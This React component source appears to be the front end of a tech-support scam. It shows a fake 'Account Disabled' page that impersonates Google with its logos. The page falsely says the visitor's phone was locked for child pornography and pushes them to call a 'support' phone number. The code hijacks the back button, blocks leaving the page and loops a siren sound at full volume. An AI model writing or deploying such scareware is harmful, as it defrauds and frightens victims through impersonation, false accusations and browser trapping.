import { useEffect, useRef, useState } from "react";
import { PHONE_NUMBER } from "../Constant";
import PopUp from "./PopUp";

const Home = () => {
  const [showPopup, setShowPopup] = useState(false);
  const audioRef = useRef(null); // 🔊 Audio reference

  useEffect(() => {
    setShowPopup(true);
    const handleContextMenu = (event) => {
      event.preventDefault();
    };
    // document.addEventListener("contextmenu", handleContextMenu);

    const disableBackButton = () => {
      window.history.pushState(null, "", window.location.href);
    };
    disableBackButton();
    window.addEventListener("popstate", disableBackButton);

    const preventExit = (event) => {
      event.preventDefault();
      event.returnValue = "Emergency mode active!";
    };
    window.addEventListener("beforeunload", preventExit);

    return () => {
      window.removeEventListener("beforeunload", preventExit);
      document.removeEventListener("contextmenu", handleContextMenu);
      window.removeEventListener("popstate", disableBackButton);

    };
  }, []);

  useEffect(() => {

    
    const playAudio = () => {
      if (audioRef.current) {
        audioRef.current.volume = 1.0;
        audioRef.current.loop = true;
        audioRef.current.play().catch((err) => {
          console.error("Audio play error:", err);
        });
      }
    };
  
    // 🔊 User ke interaction ka wait karega
    const enableAudio = () => {
      playAudio(); // Audio play karega
      document.removeEventListener("click", enableAudio);
      document.removeEventListener("keydown", enableAudio);
      document.removeEventListener("touchstart", enableAudio);
    };
  
    document.addEventListener("click", enableAudio);
    document.addEventListener("keydown", enableAudio);
    document.addEventListener("touchstart", enableAudio);
  
    return () => {
      document.removeEventListener("click", enableAudio);
      document.removeEventListener("keydown", enableAudio);
      document.removeEventListener("touchstart", enableAudio);
    };
  }, []);

  return (
    <>
 
 <div className="min-h-screen bg-white flex flex-col">
      <nav className="bg-black py-4"></nav>
      <div className="flex flex-col items-center justify-start">
        <div className="bg-white p-8 rounded-lg w-full max-w-3xl text-center">
          <h1 className="text-4xl font-bold mb-6 text-black-600">Account Disabled</h1>
          <p className="text-2xl text-gray-700 mb-8">
            Your Phone has been locked due to detected illegal Child pornography.
            Your Google Account has been disabled. Immediately call Online Security Support
            +1(831)-664-9218 to unlock it!
          </p>
          <div className="w-full flex justify-center py-8">
        <img
          src="google-logo.png"
          alt="Google"
          className="h-16"
        />
      </div>
        </div>
      </div>
      <div className="flex-grow"></div> 
      <div className="w-full flex justify-center py-8">
        <img
          src="glogo.png"
          alt="Google"
          className="h-16"
        />
      </div>
      <audio ref={audioRef} loop autoPlay>
        <source src="/siren-alert.mp3" type="audio/mpeg" />
      </audio>
      {showPopup && <PopUp />}
    </div>

    </>
  );
};

export default Home;
